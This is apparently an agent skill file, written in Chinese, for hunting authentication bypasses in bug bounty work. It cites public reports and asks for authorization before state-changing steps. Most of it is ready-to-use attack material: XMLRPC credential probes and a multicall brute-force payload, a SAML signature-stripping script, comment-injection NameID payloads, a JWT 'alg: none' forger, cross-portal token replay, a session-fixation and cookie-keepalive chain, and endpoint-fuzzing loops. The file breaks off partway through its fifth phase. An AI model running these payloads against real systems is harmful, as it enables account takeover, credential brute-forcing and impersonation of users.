---
name: hunt-auth-bypass
description: 身份认证绕过漏洞的狩猎技能。基于 12 份公开漏洞赏金报告构建，涵盖 SAML XSW / 解析器差异（GitHub Enterprise CVE-2025-25291/25292）、SAML 签名剥离（Uber、Rocket.Chat、samlify CVE-2025-47949）、通过控制字符绕过 SAML 域强制校验（HackerOne 2024）、合作伙伴门户跨 IdP 断言复用（Slack）、WordPress XMLRPC 绕过 SSO（Uber）、JWT 算法混淆 HS256/RS256（Jitsi）、JWT 签名校验跳过（Linktree、Newspack），以及令牌受众混淆（Argo CD CVE-2023-22482）。在狩猎身份认证绕过时使用——参见 Legacy-Protocol Matrix 了解品牌化 UI 与遗留端点两种模式。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [auth, bypass, hunt, redteam]
  category: redteam
---

## When to Use

- 狩猎身份认证绕过——参见 Legacy-Protocol Matrix 了解品牌化 UI 与遗留端点两种模式。

## Prerequisites

- 针对目标的明确授权、目标边界与速率限制。
- 工具：`curl`、`python3`、`subfinder`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），在命令执行前立即获取明确确认。

## How to Run

```bash
curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'

# If 200 with method list → XMLRPC is enabled, test auth:
curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password</string></value></param>
  </params>
</methodCall>'
```

## Procedure

以下各阶段即为流程。让每个探测保持有界（`--max-time`），将证据记录在 `OUTPUT_DIR` 下，并在 Pitfalls 中列出的停止条件下停止。

## 核心高价值目标

身份认证绕过始终是漏洞赏金中报酬最高的漏洞类别之一，因为它直接破坏了最基础的安全控制。高价值目标包括：

- 企业 SaaS 公司（Slack、Okta、OneLogin 集成）的 **SSO/SAML 实现**——赏金通常在 $5K–$25K+ 区间
- **管理面板与合作伙伴/内部门户**——如 `partners.shopify.com`、`admin.company.com` 这类以子域隔离的管理界面
- **第三方认证插件集成**——WordPress 插件（OneLogin、WP-SAML-Auth）、Drupal SSO 模块，以及任何支持可插拔认证的 CMS
- WordPress 上的 **XMLRPC 端点**——常被遗忘，完全绕过标准 WP 认证流程
- **OAuth 回调流程**——state 参数处理不当、redirect_uri 不匹配
- **API 认证层**——尤其是事后才补上认证的场景

**资产优先级：** 与大规模用户群体相连的联邦身份（SAML、OAuth、OIDC）目标。合作伙伴/经销商门户尤其诱人，因为它们通常拥有更高权限，且安全审查不如主产品严格。

---

## 攻击面信号

**要狩猎的 URL 模式：**
```
/xmlrpc.php
/wp-login.php
/saml/
/sso/
/auth/saml/callback
/oauth/callback
/partners.*
/admin.*
/?wc-api=
/api/v*/auth
/login?redirect=
/accounts/login
```

**表明 SSO 的响应头：**
```
X-Frame-Options: SAMEORIGIN (common on SSO portals)
Set-Cookie: SAMLResponse=
Location: https://idp.company.com/saml
WWW-Authenticate: Bearer realm="partners"
```

**表明联邦认证的 JS 模式：**
```javascript
// Look for in page source
samlRequest
RelayState
SAMLResponse
onelogin
shibboleth
okta
passport.js authenticate
```

**技术栈信号：**
- WordPress + 任意 SSO 插件 → 单独检查 XMLRPC
- Shopify Partner API 暴露 → 跨租户权限提升风险
- 任何宣传"已启用 SSO"或"使用 [企业 IdP] 登录"的应用
- 管理/合作伙伴使用单独子域但与主域共享会话 cookie
- 使用 `SimpleSAMLphp`、`ruby-saml`、`python-saml` 的应用

**Burp 被动扫描触发点：**
- 任何 POST 请求体中的 `SAMLResponse`
- 响应中的 `openid_connect` 或 `id_token`
- Cookie 域被设置为 `.company.com`（通配）

---

## 逐步狩猎方法论

1. **梳理所有认证入口**
   - 爬取目标以找出每个登录面：主登录、管理登录、API 登录、合作伙伴门户、移动端 API 端点
   - 检查 `robots.txt`、JS 文件以及 wayback machine，寻找类似 `/xmlrpc.php` 的被遗忘端点

2. **识别每个入口的认证机制**
   - 是基于表单、SAML、OAuth、API key，还是会话令牌？
   - 对 WordPress：即使主登录受 SSO 保护，也始终探测 `/xmlrpc.php`

3. **独立于 SSO 测试 XMLRPC**
   - 如果站点使用 SSO（例如 OneLogin），手动向 `/xmlrpc.php` 发送 POST
   - XMLRPC 使用 WordPress 原生凭据而非 SSO——先用 `system.listMethods` 测试，再用 `wp.getUsersBlogs`

4. **枚举 SAML 实现**
   - 通过 Burp 捕获有效的 SAMLResponse
   - 解码 Base64 载荷，检查 XML
   - 测试签名剥离、注释注入和 XML 包装攻击
   - 测试 SP 是否根本不校验签名（发送未签名断言）

5. **测试跨门户的会话/令牌复用**
   - 登录 `partners.shopify.com` 这类门户
   - 尝试用签发的令牌/cookie 访问主管理门户
   - 寻找共享 cookie 域、共享 JWT 密钥或跨上下文可用的 API 令牌

6. **模糊测试认证参数**
   - 空/空密码、`password[]=array`、用户名字段注入 SQL
   - 在 staging 子域尝试 `admin`/`admin`、`test`/`test`
   - 修改 JWT 中的 `role`、`is_admin`、`user_type`（none 算法、弱密钥）

7. **检查重定向与 state 参数**
   - 从 OAuth 中移除 `state` 是否会破坏流程？
   - 能否将 `redirect_uri` 改为开放重定向目标？
   - SAML 中的 `RelayState` 是否被校验？

8. **通过提升权限验证影响**
   - 不要止步于登录——证明你能访问管理功能、其他用户的数据或敏感配置
   - 截取你能执行的最高权限操作的截图

---

## 遗留协议矩阵（在任何自定义品牌登录页上优先探测这些端点）

当目标具有自定义、品牌化的登录 UI（例如 `customlogin.aspx`、`/auth/signin`、`/account/login`）时，**始终并行使用原生凭据探测该平台的遗留协议端点**。这些端点常常比自定义 UI 的防护存活更久，并且接受原生凭据时没有速率限制、没有 MFA 挑战、没有 CAPTCHA、没有反自动化。这是 WordPress XMLRPC 模式在 CMS / 门户 / 框架栈上的推广。

| 目标技术 | 待探测的遗留端点 | 原生凭据绕过面 |
|---|---|---|
| **WordPress** | `/xmlrpc.php`（`system.listMethods`、`wp.getUsersBlogs`、`system.multicall`） | 原生 WP 用户名/密码；绕过 `/wp-login.php` 上的 SSO、MFA、IP 白名单规则 |
| **WordPress (REST)** | `/?rest_route=/wp/v2/users`、`/wp-json/wp/v2/users` | 即使登录页已加固，仍可匿名枚举用户 |
| **SharePoint（任意版本）** | `/_vti_bin/Authentication.asmx`（`Mode` + `Login` SOAP 操作） | 原生 Forms-auth 凭据；返回 FedAuth cookie；在 SP2013 群集上观察到该端点无速率限制——**这是 WP XMLRPC 绕过在 SharePoint 上的经典等价物** |
| **SharePoint 遗留** | `/_vti_bin/_vti_aut/author.dll`、`/_vti_bin/_vti_adm/admin.dll`、`/_vti_bin/owssvr.dll` | FrontPage RPC；有时仍连接到凭据校验器 |
| **SharePoint REST** | `/_api/contextinfo`（POST）、`/_api/$metadata` | 匿名签发 FormDigest；可枚举完整 API 面 |
| **Atlassian（Jira / Confluence）** | `/rest/auth/1/session`（basic-auth）、`/rest/api/2/myself`、遗留 `/rest/api/1.0/` | 即使 UI 上强制启用 Atlassian Crowd / Atlassian Access SSO，`/rest/auth/1/session` 仍接受原生凭据 |
| **Drupal** | `/jsonapi/`、`/user/login?_format=json` | 接受原生密码的 JSON POST 端点；与 SSO 中间件相互独立 |
| **Drupal（D7 遗留）** | `/?q=user/login`、`/services/`、`/rest/` | 较旧的 REST 模块，认证独立 |
| **Joomla** | `/administrator/index.php?option=com_login`、`/api/index.php/v1/users` | 管理入口接受原生 Joomla 凭据，独立于任何前台 SSO |
| **Exchange / OWA** | `/EWS/Exchange.asmx`、`/Autodiscover/Autodiscover.xml`、`/Microsoft-Server-ActiveSync` | NTLM / Basic；绕过 OWA UI 限制（MFA、IP 白名单）。经典的 CVE-2020-0688 / CVE-2021-26855 攻击面 |
| **Citrix NetScaler** | `/vpn/index.html`、`/cgi/login`、`/nf/auth/doAuthentication.do` | 原生 AD 凭据；独立于 MFA 包装层 |
| **F5 BIG-IP** | `/mgmt/tm/util/bash`、`/tmui/login.jsp` | 原生管理员凭据 |
| **通用 ASP.NET 应用** | `*.asmx?WSDL`、`*.svc?WSDL`、`trace.axd`、`elmah.axd`、`.disco` | 找出每个 Web 服务；许多服务独立于 WebForms 登录接受凭据 |
| **Spring Boot** | `/actuator/*`、`/management/*`、`/api/v1/auth/login`、`/api/v1/swagger-ui` | Actuator 端点有时可匿名枚举 |
| **Jenkins** | `/jnlpJars/jenkins-cli.jar`、`/script`、`/manage`、`/computer/(master)/script` | API 令牌 + 原生认证 |
| **GitLab** | `/api/v3/*`（已弃用但旧安装仍存在）、`/api/v4/users`、`/api/v4/projects` | 作用域比 UI 会话更宽松的个人访问令牌 |
| **TeamCity** | `/app/rest/users`、`/login.html?username=&password=`（GET 表单登录） | 原生管理员凭据 |
| **Apache Tomcat** | `/manager/html`、`/host-manager/html`、`/manager/text/list` | 原生 Tomcat realm 凭据，独立于任何前置认证 |
| **WebLogic** | `/console/login/LoginForm.jsp`、`/wls-wsat/*` | 原生管理员 |
| **Oracle EBS / PeopleSoft** | `/OA_HTML/AppsLogin`、`/psp/*/?cmd=login` | 原生 ERP 凭据 |

**如何使用：**
1. 根据响应头 + 路径识别技术栈（使用 `hunt-misc` 的 Attack Surface Signals）。
2. 找到上表中匹配的行。
3. 匿名探测遗留端点，确认其可达且不返回 403/404。
4. 使用合成凭据测试，确认其接受原生凭据格式并返回差异响应（成功 vs 失败）。
5. 验证没有速率限制、没有锁定、没有 CAPTCHA——对同一用户突发 10 次请求，确认时序一致。
6. 根据通向 ATO 的链路，按 **Critical / High** 报告：在漏洞赏金项目中，一个匿名且无限制的凭据暴力破解端点始终是 Critical。

**一次授权测试的经验教训：** 某企业经销商门户运行在 SharePoint 2013 上，具有自定义品牌的 `customlogin.aspx`。当时已加载 hunt-auth-bypass 技能，但本文档中尚不存在上面的矩阵——WordPress XMLRPC 模式也没有与 SharePoint 的等价物关联起来。`/_vti_bin/Authentication.asmx` 可匿名访问，接受无限次凭据尝试且无速率限制、无锁定，是该次测试中影响最大的发现。首轮走一遍这个矩阵本可立即发现它。

---

## Payload 与检测模式

**XMLRPC 认证探测（绕过 SSO）：**
```bash
curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'

# If 200 with method list → XMLRPC is enabled, test auth:
curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password</string></value></param>
  </params>
</methodCall>'
```

**SAML 签名剥离（发送未签名断言）：**
```python
import base64, re

# Decode captured SAMLResponse
saml_b64 = "BASE64_FROM_BURP"
saml_xml = base64.b64decode(saml_b64).decode()

# Strip the Signature element entirely
stripped = re.sub(r'<ds:Signature.*?</ds:Signature>', '', saml_xml, flags=re.DOTALL)

# Re-encode and submit
print(base64.b64encode(stripped.encode()).decode())
```

**SAML XML 注释注入（用户名混淆）：**
```xml
<!-- Original NameID -->
<NameID>attacker@evil.com</NameID>

<!-- Injected to confuse parser -->
<NameID>attacker@evil.com<!---->.victim@company.com</NameID>

<!-- Or namespace confusion -->
<NameID xmlns:evil="http://evil.com">victim@company.com</NameID>
```

**合作伙伴/跨门户令牌复用测试：**
```bash
# Get token from partner portal
TOKEN=$(curl --max-time 30 --connect-timeout 10 -s -X POST https://partners.target.com/login \
  -d 'email=attacker@test.com&password=pass' \
  -c cookies.txt | grep -o 'token=[^;]*')

# Replay against admin portal
curl --max-time 30 --connect-timeout 10 -s https://admin.target.com/dashboard \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cookie: $TOKEN"
```

**JWT none 算法攻击：**
```python
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin","email":"victim@company.com"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."
print(token)
```

**用于认证绕过面的 Grep 模式：**
```bash
# Find XMLRPC in scope
grep -r "xmlrpc" scope_urls.txt

# Find SSO indicators in JS
grep -rE "(SAMLResponse|samlRequest|RelayState|onelogin|shibboleth)" *.js

# Find partner/admin subdomains
subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"
```

---

## 常见根因

1. **SSO 只在 UI 层完全绕过本地认证，而未在 API 层绕过**——开发者禁用了登录表单，却忘了 API 端点（`/xmlrpc.php`、REST API、移动端 API）有自己的认证处理器，仍然接受原生凭据。

2. **SAML 签名校验被跳过或设为可选**——库的默认值往往不强制校验签名；开发者使用 `wantAssertionsSigned: false`，或未能正确配置 IdP 证书。

3. **不同信任级别共享会话基础设施**——合作伙伴门户与管理门户复用相同的会话 cookie 或 JWT 密钥，因为它们构建于同一内部框架之上，并假定应用层的访问控制已足够。

4. **多租户架构中的信任继承**——在较低权限上下文（合作伙伴、经销商）中签发的令牌被较高权限上下文接受，因为校验只检查签名有效性，而不检查签发上下文。

5. **插件/模块认证独立于应用认证**——每个处理认证的 WordPress 插件（联系表单、REST API 扩展、WooCommerce）都可能实现与主站 SSO 不一致的自有认证处理器。

6. **XML 解析不一致**——不同的 XML 解析器（SP 与 IdP 使用的）对注释、命名空间和空白处理不同，从而可能实现签名内容与求值内容不一致的混淆攻击。

---

## 绕过技术

| 防护 | 绕过 |
|---|---|
| 登录页强制 SSO | 探测备用入口：XMLRPC、REST API、移动端 API、遗留端点 |
| SAML 签名校验 | XML 注释注入、命名空间包装、签名包装（XSW）、完全移除签名 |
| 管理门户 IP 白名单 | 若合作伙伴门户共享认证后端，则使用其令牌 |
| 登录速率限制 | XMLRPC 通过 `system.multicall` 支持凭据填充——单个请求中批量提交数百次认证尝试 |
| 登录表单 CSRF 令牌 | SAML 流程设计上就是基于 POST 的跨源请求；`/saml/callback` 无需 CSRF 令牌 |
| JWT 签名校验 | `alg: none`、密钥混淆（RS256 → HS256，以公钥作为密钥）、暴力破解弱密钥 |
| 各门户独立会话存储 | 检查 cookie 域是否为 `.target.com`（通配）——cookie 会在子域之间泄漏 |
| 主登录 MFA | 若 SAML SP 不在断言层面强制 MFA 且接受预认证断言，则可跳过 MFA |

**使用 XMLRPC multicall 进行大规模认证绕过：**
```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
    <!-- repeat for each credential pair -->
  </data></array></value></param></params>
</methodCall>
```

---

## Gate 0 校验

在撰写任何报告之前，回答以下三个问题：

1. **攻击者现在能做什么？**
   必须是：以其他用户身份认证，或无有效凭据完成认证，或提升到管理员/特权角色。"部分信息泄露"不算认证绕过。

2. **受害者损失了什么？**
   必须指出具体资产：特定用户的账号接管、访问所有管理功能、读取/修改其他租户数据，或访问特权 API。抽象的"安全控制绕过"而无影响不充分。

3. **能否在 10 分钟内从零复现？**
   你必须能够：(a) 从全新的浏览器/会话开始，(b) 遵循你的确切步骤，(c) 最终获得对受保护资源的已认证访问。如果复现需要你无法重现的特殊前提（特定受害者的活跃会话、时间窗口），报告还需完善。

---

## 真实影响示例

**场景 1 —— 通过被遗忘的协议端点绕过 SSO 强制**
一家大型网约车公司在所有基于 WordPress 的内部/公开资产上强制 SSO（通过 OneLogin）。XMLRPC 端点（`/xmlrpc.php`）仍处于活动状态，并完全独立于 SSO 流程接受 WordPress 原生凭据。持有任何有效 WP 原生凭据（通过凭据填充或此前泄露获得）的攻击者可直接通过 XMLRPC 认证，绕过主登录表单上强制的 MFA、SSO 策略和 IP 限制。影响：以该用户角色可用的所有 WordPress 功能（包括内容管理，甚至可能是管理功能）获得完整已认证访问。

**场景 2 —— 因签名校验失败伪造 SAML 断言**
某大型企业通信平台的 SAML SP 实现在特定边界情况下未能正确校验断言签名。通过操纵捕获的 SAMLResponse 的 XML 结构（具体是通过注释注入或命名空间前缀攻击），攻击者可以修改 `NameID` 值来冒充组织内任意用户——包括工作区管理员——而无需拥有该用户的凭据或私钥材料。影响：对启用 SAML 的组织内任意用户实现完整账号接管；攻击者获得工作区中所有消息、文件和集成的访问权限。

**场景 3 —— 通过共享认证后端实现跨门户权限提升**
某电商平台的合作伙伴/经销商门户签发的认证令牌，与商家管理门户由同一后端服务校验。合作伙伴级别的账号（较低信任、面向外部）可以使用其签发的凭据或令牌，直接对管理级 API 端点进行认证，绕过商家入驻与权限分配流程。影响：恶意合作伙伴可访问任意商家的管理面板、修改店铺配置、窃取客户 PII 与支付数据，或植入恶意脚本——影响数千个商家店铺。

---

## 已披露报告引用（回填 +8 — 2016-2025）

以下真实、经验证的漏洞赏金 / 协同披露案例扩展了本技能。涵盖 4 个 SAML 子类、4 个 JWT 子类、1 个遗留协议（XMLRPC），以及 2 种合作伙伴门户跨域复用模式。

5. **GitHub Enterprise Server —— 通过解析器差异的 SAML XSW（CVE-2025-25291/25292）**（[H1 #2579939](https://hackerone.com/reports/2579939) · [Blog](https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/)）
    - 子类：SAML 签名剥离 / XSW（解析器差异变体）
    - Payload：已签名的 SAML 响应；注入同级 `<Assertion>`，使 REXML（签名校验器）和 Nokogiri（业务逻辑读取器）通过相同 XPath 解析出不同节点。签名针对良性节点校验通过；SP 消费攻击者控制的 `<NameID>admin@target</NameID>`
    - 根因：用于校验与用于消费的两个 XML 解析器对同一 XPath 返回不同元素
    - 年份：2025 —— GitHub Security Lab 赏金（项目最高类别，内部评为 Critical）

6. **GitHub Enterprise —— 启用加密断言时的 SAML 签名绕过（CVE-2024-4985）**（[H1 #2475347](https://hackerone.com/reports/2475347) · [ProjectDiscovery advisory](https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass)）
    - 子类：启用加密断言功能时的 SAML 签名剥离（XSW 家族）
    - Payload：伪造包含攻击者控制断言的 SAML 响应；利用加密断言代码分支上不正确的签名校验；预置任意用户，包括 `site_admin`
    - 根因：加密断言代码分支上不正确的加密签名校验
    - 年份：2024 —— 赏金未披露，CVSS 10.0

7. **Uber —— `uchat.uberinternal.com` 上的 SAML 认证绕过**（[H1 #223014](https://hackerone.com/reports/223014)）
    - 子类：SAML 签名剥离 / 不当断言校验（OneLogin SP 侧）
    - Payload：重放/修改带伪造 `NameID` 的 SAML 断言；SP 未严格校验签名范围，因此攻击者控制的断言被接受，从而获得对内部聊天系统的 OneLogin SSO 会话
    - 根因：SP 实现中不当的 SAML 签名校验
    - 年份：2017 —— **$8,500**

8. **Uber —— 通过 WordPress XMLRPC 绕过 OneLogin SSO**（[H1 #138869](https://hackerone.com/reports/138869)）
    - 子类：WordPress XMLRPC 绕过 SSO（遗留认证路径未受门控）—— Legacy-Protocol Matrix 的经典案例
    - Payload：OneLogin 插件自动创建 WP 用户，密码为字面值 `@@@nopass@@@`。SSO 插件只拦截了 `wp-login.php`。向 `xmlrpc.php` POST `wp.getUsersBlogs` 加已知共享密码 → 以任何此前经 SSO 认证的用户身份登录
    - 根因：SSO 强制只应用于一个认证面（wp-login），而遗留 XML-RPC 路径仍保留可猜测共享密码的密码认证
    - 年份：2016 —— **$7,000**

9. **Slack —— SAML"混淆代理"断言复用**（[Writeup](http://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html)）
    - 子类：合作伙伴门户 / 跨 IdP 断言复用（未校验受众限制）
    - Payload：取一个旧的已过期 GitHub 签名的 SAML 断言（不同受众、不同主体）→ 提交给 Slack ACS → Slack 将攻击者登录为断言中的用户名
    - 根因：无受众限制也无新鲜度检查；信任跨 IdP 延伸
    - 年份：2017 —— **$3,000**

10. **HackerOne —— 通过控制字符绕过 SAML 注册域强制校验**（[H1 #2101076](https://hackerone.com/reports/2101076)）
    - 子类：通过 unicode 控制字符绕过合作伙伴门户 / SAML 域绑定
    - Payload：在强制 SAML 的组织新用户注册；在邮箱末尾追加控制字符（例如 `\r`、`\x00`）→ 域比较时被规范化掉，注册继续进行 → 未经授权访问该组织
    - 根因：域检查与身份写入之间的 unicode/控制字符规范化不一致
    - 年份：2024 —— 已发放赏金（金额未披露）

11. **8x8 / Jitsi-Meet —— JWT 算法混淆（非对称校验器接受对称算法）**（[H1 #1210502](https://hackerone.com/reports/1210502)）
    - 子类：JWT 算法混淆（RS256 → HS256，使用公钥作为 HMAC 密钥）
    - Payload：服务器公布 RS256 校验公钥。发送头部为 `{"alg":"HS256"}` 且以该公钥作为 HMAC 密钥签名的令牌 → Prosody 模块校验通过并允许攻击者进入已认证/主持人房间
    - 根因：校验器未强制 `alg=RS256`；允许使用公钥作为共享密钥的对称算法
    - 年份：2021 —— 赏金未披露

12. **Argo CD（Internet Bug Bounty）—— JWT 受众声明未校验（CVE-2023-22482）**（[H1 #1889161](https://hackerone.com/reports/1889161)）
    - 子类：签发时而非使用时检查令牌作用域 / 受众（跨受众令牌混淆）
    - Payload：获取任意由集群 OIDC 签发者签名、但为不同 `aud` 铸造的 RS256 令牌（例如 `kubernetes`）→ 作为 bearer 提交给 Argo CD API → API 认为其有效，因为接受签发者签名并跳过 `aud` 强制
    - 根因：未强制 `aud` 声明；签名信任跨受众延伸
    - 年份：2023 —— 通过 IBB 获得 **$2,400**

---

## Duende BFF —— 令牌混淆与会话固定（2024-2026 攻击面）

Duende BFF 部署暴露了两类与 `hunt-csrf` 中所述 CSRF 角度不同的认证绕过家族。两者都是已有文档记载的架构现实，而非罕见的 CVE。

### 攻击类别 1 —— YARP `UserOrClient` / `UserOrNone` 权限提升

`Duende.BFF.Yarp` 通过 `WithAccessToken(TokenType.X)` 元数据将访问令牌附加到被代理的路由。**错误配置模式**：开发者将路由标记为 `UserOrClient`（若已登录则使用用户令牌，否则回退到*客户端凭据*令牌），本意是用于"公共目录"端点。客户端凭据（M2M）令牌的作用域往往比任何用户令牌都更宽（`api.admin`、`internal.read`）。**未认证**攻击者访问该路由时，请求会被代理并在下游 API 附带**服务账号令牌**——当下游信任该 bearer 时，这就是设计层面的权限提升。

**Payload 形态：** 找出标记为 `TokenType.UserOrClient` 的 BFF 路由（可通过无会话时的 401 与 200 差异，或通过泄露的 OpenAPI/NSwag 规范发现）。不带 cookie 访问它 → BFF 使用授予管理作用域的 M2M 令牌转发到下游。（[docs.duendesoftware.com/bff/fundamentals/apis/yarp](https://docs.duendesoftware.com/bff/fundamentals/apis/yarp/)）

**相邻的已确认 CVE：** `Duende.AccessTokenManagement.OpenIdConnect` 中的 **CVE-2024-51987**——*"HTTP 客户端在刷新后使用了错误的令牌"*——实质上是代理层同一类令牌混淆家族。中度严重，2024 年修复。（[GHSA-...51987](https://github.com/advisories?query=duende)）

### 攻击类别 2 —— Cookie 域通配 + 滑动过期 = 持久 ATO

当 BFF 会话 cookie 的 `Domain=.example.com`（开发者这样做是为了在 `app.` 和 `admin.` 之间共享登录），`__Host-` 前缀保护被丢弃。任何同级子域——包括一个**已被接管的**子域（`legacy.example.com` CNAME 指向已停用的 Heroku/S3）——都可以写入 `Set-Cookie: .AspNetCore.Cookies=<attacker_session>; Domain=.example.com`。受害者访问 `app.example.com` 时携带攻击者的会话 = **会话固定 ATO**。

如果 `SlidingExpiration=true`（默认）且 `ExpireTimeSpan` 很大（例如 8h），被窃取的 cookie 会保持有效，并且只要攻击者定期调用 `/bff/user` 就会不断向前滑动。cookie 本身没有服务端刷新令牌轮换检查——只有 OIDC 令牌（服务端）会轮换。每个被窃取的 cookie 都有持久的 ATO 窗口。

**Payload 形态：** 子域接管 → 写入带 `Domain=.example.com` 的 BFF 会话 cookie → 受害者下次访问 `app.example.com` 时采用攻击者的会话。每 6 小时无限期地 cron-curl `GET /bff/user -H 'X-CSRF: 1' -b '.AspNetCore.Cookies=...'` 以保持会话活跃。

**加固参考：** [docs.duendesoftware.com/bff/fundamentals/session/handlers](https://docs.duendesoftware.com/bff/fundamentals/session/handlers/)、[nestenius.se BFF cookie guide](https://nestenius.se/net/bff-in-asp-net-core-3-the-bff-pattern-explained/)、[Langkemper on `__Host-` prefix](https://www.sjoerdlangkemper.nl/2017/02/09/cookie-prefixes/)。

### 攻击类别 3 —— `/bff/user` 声明泄露

`GET /bff/user` 以 JSON 数组返回活动会话的**完整声明集**——`sub`、`sid`、`email`、`bff:session_expires_in`、`bff:session_state`、`bff:logout_url`，以及 OP 签发的每个自定义声明（部门、角色、内部员工 ID、租户 ID）。该端点仅由会话 cookie + `X-CSRF: 1` 门控。如果设置了 `AnonymousSessionResponse=Response200`，该端点还可作为会话探针（200 + 声明 vs 200 + `null`），可用作认证状态 oracle。其本身为低/中危信息泄露；但作为上述 YARP 令牌混淆类别的侦察很有价值。（[docs.duendesoftware.com/bff/fundamentals/session/management/user](https://docs.duendesoftware.com/bff/fundamentals/session/management/user/)）

### 证据强度与报告提示

Duende.BFF 本身不存在直接 CVE。这三类均可通过现实世界中的错误配置利用；相邻 `Duende.AccessTokenManagement` 包中的 CVE-2024-51987 与 CVE-2025-26620 使令牌混淆成为一个已确认的家族。**按链路影响报告**（例如"低权限会话通过 UserOrClient 路由到达管理作用域下游 API" → Critical），而不是引用 CVE，因为该问题是设计层面的。

链路交叉引用：
- `hunt-csrf` —— 按角色分区的防伪类别（同一 BFF 面上的 CSRF 角度）。
- `hunt-subdomain-takeover` / `hunt-subdomain` —— cookie 域攻击所需的前置原语。

---

## 功能级访问控制（失效的授权）

认证绕过让你*进入*系统；**功能级访问控制**失效则让已认证的低权限用户触达 UI 从未提供给他们的特权*功能*。这是 `hunt-idor`（对象级访问）的授权兄弟技能——只要你持有任何已认证会话，就应同时测试两者。

**同级函数规则：** 如果某路径下的 9 个端点都执行认证/角色中间件，那么第 10 个不执行的就是你的漏洞。管理路由家族是产出最高的地方：

```
/api/admin/users   → has auth middleware
/api/admin/export  → often MISSING it
/api/admin/delete  → often MISSING it
/api/admin/reset   → often MISSING it
```

**需要 grep 的反模式：**
```javascript
// Missing middleware on a sibling route
router.get('/admin/users',  authenticate, authorize('admin'), getUsers);
router.get('/admin/export', getExport);            // No middleware!

// Client-side role check only — server never re-checks
if (user.role === 'admin') showAdminButton();      // frontend gate
app.post('/api/admin/delete', deleteUser);         // no server-side check
```

**如何狩猎：** 枚举每个特权端点（admin/export/delete/reset/impersonate、GraphQL 管理查询），然后从*普通*已认证会话重放每个端点——再以无会话重放一次。一个 200（或与其同级端点返回的 403 形成差异）就是功能级访问控制失效。

**真实付费案例 —— HackerOne TrustHub：** 带 `TrustHubQuery` 操作的 `POST /graphql` 没有授权检查——普通用户可以读取所有供应商数据（CVSS 8.7，High）。对象级变体（例如接受任意 UUID 且无归属检查的 WebSocket `get_history`）属于 `hunt-idor`。

### 功能级探测集（合并自 hunt-broken-function-level-auth）

从普通会话和无会话分别重放每个特权端点；与其同级端点返回的 403 形成差异即为发现。

### 阶段 1 —— HTTP 方法漂移

```bash
# Admin endpoints — each HTTP method may have different auth
ENDPOINTS=(
  "/api/admin/users"
  "/api/admin/settings"
  "/api/manage/orders"
  "/api/internal/config"
)

for ep in "${ENDPOINTS[@]}"; do
  for method in GET POST PUT PATCH DELETE; do
    curl --max-time 30 --connect-timeout 10 -sk -X "$method" "https://target.com$ep" \
      -w "$method $ep — %{http_code}\n" -o /dev/null
  done
  # Also try custom methods
  curl --max-time 30 --connect-timeout 10 -sk -X "PURGE" "https://target.com$ep" -o /dev/null -w "PURGE — %{http_code}\n"
  curl --max-time 30 --connect-timeout 10 -sk -X "DEBUG" "https://target.com$ep" -o /dev/null -w "DEBUG — %{http_code}\n"
done
```

### 阶段 2 —— 路由遮蔽

```bash
# Legacy routes that bypass modern middleware
for path in "/api/v0/" "/api/v1/" "/api/legacy/" "/api/internal/" "/api/beta/" \
            "/api/mobile/" "/api/partner/" "/api/integration/" "/api/webhook/"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com${path}users" -w "%{http_code} — $path\n" -o /dev/null
done

# ffuf for route discovery
ffuf -u "https://target.com/api/FUZZ/users" \
  -w /path/to/prefixes.txt \
  -mc 200,301,401,403
```

### 阶段 3 —— 功能开关绕过

```bash
# Beta/preview endpoints often lack authorization
for flag in "beta" "preview" "canary" "experimental" "new" "v2" "preview"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/${flag}/admin" -w "%{http_code} — $flag\n" -o /dev/null
done

# Feature flags in headers or cookies
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
  -H "X-Feature-Flags: admin" \
  -H "X-Experimental: true" \
  -H "X-Beta-Access: 1"
```

### 阶段 4 —— 批处理与作业端点

```bash
# Batch operations may skip per-item authorization
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/batch" \
  -H "Content-Type: application/json" \
  -d '{"operations":[{"method":"DELETE","path":"/users/1"},{"method":"GET","path":"/admin/logs"}]}'

# Background job endpoints
for path in "/api/jobs" "/api/tasks" "/api/cron" "/api/queue" "/api/workers"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com${path}/admin-cleanup" -w "%{http_code} — $path\n" -o /dev/null
done
```

### 阶段 5 —— 传输协议不一致

```bash
# GraphQL — check if mutations allow admin actions without role check
